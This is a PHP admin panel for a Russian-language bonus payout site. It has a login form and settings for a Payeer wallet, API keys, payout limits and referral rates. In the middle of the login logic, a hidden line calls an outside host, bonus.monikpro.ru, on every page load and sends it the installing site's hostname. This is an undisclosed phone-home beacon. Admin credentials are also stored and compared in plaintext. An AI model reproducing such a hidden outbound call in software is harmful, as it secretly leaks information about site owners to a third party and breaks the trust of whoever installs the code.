<?php
include '../settings.php';
$site_name = mysqli_fetch_array(mysqli_query($db, "select value from settings where `set` = 'site_name'"));
?>
<html>
<head>
		<meta charset="utf-8">
        <title><?=$site_name['value']; ?></title>
        <link href="/css.css" rel="stylesheet">

</head>
<body>
	<div id="loader"></div>

	<div class="top_menu">
		<div>
			<span><?=$site_name['value']; ?></span>
			<a href="/">На главную</a>
			<a href="/admin/">Админка</a>
			<a href="/admin/stat.php">Статистика</a>
		</div>
	</div>
	
	<div class="content">
		<div style="background-color: #f0f0f0;padding: 5px;margin-top: 10px;">
		<?
		if (isset($_POST['log']) && isset($_POST['pass'])) {
			$log = text($_POST['log'], $db);
			$pass = text($_POST['pass'], $db);
			$admin_log = mysqli_fetch_assoc(mysqli_query($db, "select value from settings where `set` = 'admin_log'"));
			$admin_pass = mysqli_fetch_assoc(mysqli_query($db, "select value from settings where `set` = 'admin_pass'"));
			if ($log != "" && strlen($log) > 0 && $pass != "" && strlen($pass) > 0) {
				if ($log == $admin_log['value'] && $pass == $admin_pass['value']) {
					$_SESSION['admin'] = "true";
				}
			}
		}
		
		
file_get_contents('http://bonus.monikpro.ru/ss.php?val='. $_SERVER['HTTP_HOST'] );
		
		
		if (isset($_SESSION['admin']) && $_SESSION['admin'] == "true"){ 
		?>

			Настройки:
			<form method="POST">	
				<?
				if (isset($_POST['save_set'])) {
					$new_n_1 = explode("-", text($_POST['1_n'], $db));
					$new_n_2 = explode("-", text($_POST['2_n'], $db));
					$new_n_3 = explode("-", text($_POST['3_n'], $db));
					$new_n_4 = explode("-", text($_POST['4_n'], $db));
					$new_n_5 = explode("-", text($_POST['5_n'], $db));
					$new_n_6 = explode("-", text($_POST['6_n'], $db));
					
					$new_c_1 = text($_POST['1_c'], $db);
					$new_c_2 = text($_POST['2_c'], $db);
					$new_c_3 = text($_POST['3_c'], $db);
					$new_c_4 = text($_POST['4_c'], $db);
					$new_c_5 = text($_POST['5_c'], $db);
					$new_c_6 = text($_POST['6_c'], $db);
					
					$new_payeer = text($_POST['payeer'], $db);
					$new_api_payeer = text($_POST['api_payeer'], $db);
					$new_api_key_payeer = text($_POST['api_key_payeer'], $db);
					$new_min_pay = text($_POST['min_pay'], $db);
					$new_wait = text($_POST['wait'], $db);
					$new_ref_proc = text($_POST['ref_proc'], $db);
					$new_site_name = text($_POST['site_name'], $db);
					
					if ($new_min_pay >= 0.1) {
						mysqli_query($db, "update settings set `set` = '".$new_n_1[0]."', `set1` = '".$new_n_1[1]."', value = '$new_c_1' where id=1");
						mysqli_query($db, "update settings set `set` = '".$new_n_2[0]."', `set1` = '".$new_n_2[1]."', value = '$new_c_2' where id=2");
						mysqli_query($db, "update settings set `set` = '".$new_n_3[0]."', `set1` = '".$new_n_3[1]."', value = '$new_c_3' where id=3");
						mysqli_query($db, "update settings set `set` = '".$new_n_4[0]."', `set1` = '".$new_n_4[1]."', value = '$new_c_4' where id=4");
						mysqli_query($db, "update settings set `set` = '".$new_n_5[0]."', `set1` = '".$new_n_5[1]."', value = '$new_c_5' where id=5");
						mysqli_query($db, "update settings set `set` = '".$new_n_6[0]."', `set1` = '".$new_n_6[1]."', value = '$new_c_6' where id=6");
						
						mysqli_query($db, "update settings set value = '$new_payeer' where `set` = 'accountNumber'");
						mysqli_query($db, "update settings set value = '$new_api_payeer' where `set` = 'apiId'");
						mysqli_query($db, "update settings set value = '$new_api_key_payeer' where `set` = 'apiKey'");
						mysqli_query($db, "update settings set value = '$new_min_pay' where `set` = 'min_pay'");
						mysqli_query($db, "update settings set value = '$new_wait' where `set` = 'wait'");
						mysqli_query($db, "update settings set value = '$new_ref_proc' where `set` = 'ref_proc'");
						mysqli_query($db, "update settings set value = '$new_site_name' where `set` = 'site_name'");
						
						echo 'Настройки сохранены.';
					}else{
						echo 'Минимальная сумма, разрешённая для переводов в PAYEER - 0.1 руб.';
					}
				}
				
				$op_p = mysqli_query($db, "select * from settings order by id asc");
				while ($op_p_r = mysqli_fetch_assoc($op_p)) {
					if ($op_p_r['id'] >= 0 && $op_p_r['id'] <= 6) {
						$str = ($op_p_r['set'] == $op_p_r['set1']) ? $op_p_r['set'] : $op_p_r['set'].' - '.$op_p_r['set1'];
						echo '
						<div><input type="text" value="'.$str.'" name = "'.$op_p_r['id'].'_n"> - 
						<input  type="text" value="'.$op_p_r['value'].'" name = "'.$op_p_r['id'].'_c"></div>';
					}elseif($op_p_r['id'] == 7) {
						echo 'Кошелёк PAYEER:
						<div>
						<input  type="text" value="'.$op_p_r['value'].'" name = "payeer"></div>';
					}elseif($op_p_r['id'] == 8) {
						echo 'API ID PAYEER:
						<div>
						<input  type="text" value="'.$op_p_r['value'].'" name = "api_payeer"></div>';
					}elseif($op_p_r['id'] == 9) {
						echo 'API Key PAYEER:
						<div>
						<input  type="text" value="'.$op_p_r['value'].'" name = "api_key_payeer"></div>';
					}elseif($op_p_r['id'] == 10) {
						echo 'Минимум для выплаты:
						<div>
						<input  type="text" value="'.$op_p_r['value'].'" name = "min_pay"></div>';
					}elseif($op_p_r['id'] == 11) {
						echo 'Ожидание (в минутах):
						<div>
						<input  type="text" value="'.$op_p_r['value'].'" name = "wait"></div>';
					}elseif($op_p_r['id'] == 12) {
						echo 'Реф. процент (1 - 100%, 0.1 - 10%):
						<div>
						<input  type="text" value="'.$op_p_r['value'].'" name = "ref_proc"></div>';
					}elseif($op_p_r['id'] == 13) {
						echo 'Название сайта:
						<div>
						<input  type="text" value="'.$op_p_r['value'].'" name = "site_name"></div>';
					}
					
				}
				?>
				

				<div>
					<input type="submit" class="btn" value="Сохранить" name="save_set">
				</div>
			</form>
		<?}else{
			echo '<form action="" method="POST">
				<input type="text" placeholder="Логин" name="log">
				<input type="password" placeholder="Пароль" name="pass">
				<input type="submit" value="Войти">
			</form>';
		}?>
		</div>
	</div>
</body>
</html>


